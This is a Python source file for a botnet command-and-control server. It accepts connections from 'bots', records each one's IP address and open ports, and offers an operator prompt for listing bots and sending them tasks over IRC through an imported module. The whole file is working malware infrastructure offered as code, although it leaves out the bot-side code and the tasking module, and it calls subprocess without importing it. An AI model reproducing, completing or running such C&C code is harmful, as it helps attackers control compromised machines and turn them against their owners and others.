import socket
from irc_client import irc_client_program
import config
from threading import Thread
BOTS = {}
THREADS = []

def pprint_help():
    print("commands:")
    print("\t dump, \t returns a list of the active bots")
    print("\t irc, \t connect to a bot and send him tasks to perform")
    print("\t exit, \t exits")
    return

def dump():
    print("\t------ ACTIVE BOTS ------")
    for k in BOTS:
        print(f"\t {k} -> {BOTS[k]['status']}")
    return 

def get_my_ip():
    cmd = ['hostname', '-I']
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    o, e = proc.communicate()
    my_ip = o.decode('ascii')
    return my_ip[:-1]

def get_host_info(conn):
    # get info on ip
    ip = conn.recv(1024).decode()
    if not ip:
        conn.send("RST".encode())
        return 0
    conn.send("ACK".encode())
    ip = ip[7:]

    # get info on open ports
    ss = conn.recv(1024).decode()
    if not ss:
        conn.send("RST".encode())
        return 0
    conn.send("ACK".encode())
    ss = ss[15:]

    return ip, ss

def stop_cc():
    print("killing C&C")
    tmp_sock = socket.socket()
    tmp_sock.connect((config.server_info["ip"], config.server_info["port"]))
    return 

def cc_cli():

    while True:
        action = input("C&C>").lower()
        match action:
            case "irc":
                irc_client_program()
            case "dump":
                dump()
            case "exit":
                break
            case _:
                pprint_help()
    stop_cc()
    return

def handle_bot_connection():
    # get the hostname
    host = config.server_info["ip"]
    port = config.server_info["port"]
    clients = 2

    server_socket = socket.socket()  # get instance
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # look closely. The bind() function takes tuple as argument
    server_socket.bind((host, port))  # bind host address and port together

    # configure how many client the server can listen simultaneously
    server_socket.listen(clients)
    # print(f"C&C listening on {host}:{port}")
    while True:
        conn, address = server_socket.accept()  # accept new connection
        # print('Connected to :', address[0], ':', address[1])
        if address[0] == config.server_info["ip"]:
            break
        host_ip, host_ports = get_host_info(conn)
        BOTS[str(host_ip)] = {"info_ports": host_ports, "status": "idle"}
        # print(f"[+] New bot connected:\n\t got info about {str(address)}: \nip: \n\t{host_ip} \nopen ports: \n\t{host_ports}")
        conn.close()
    server_socket.close()
    return

def server_program():
    
    thread_connections = Thread(target=handle_bot_connection)
    thread_connections.start()

    thread_cc_cli = Thread(target=cc_cli)
    thread_cc_cli.start()



if __name__ == '__main__':
    server_program()